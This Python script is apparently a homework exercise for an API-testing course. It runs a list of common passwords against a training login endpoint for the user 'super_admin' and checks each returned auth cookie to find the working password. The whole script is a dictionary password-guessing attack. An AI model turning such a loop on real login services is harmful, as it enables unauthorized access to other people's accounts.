import requests

cookies = {}
payload = {}
passwords = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111",
             "123123", "abc123",
             "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "7777777", "welcome", "888888",
             "princess", "dragon",
             "password1", "123qwe"]

for x in passwords:
    payload.update({"login": "super_admin", "password": x})
    response1 = requests.get("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
    cookies_value = response1.cookies.get("auth_cookie")
    cookies.update({"auth_cookie": cookies_value})
    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    if response2.text != "You are NOT authorized":
        print(f"With password '{x}': " + response2.text)
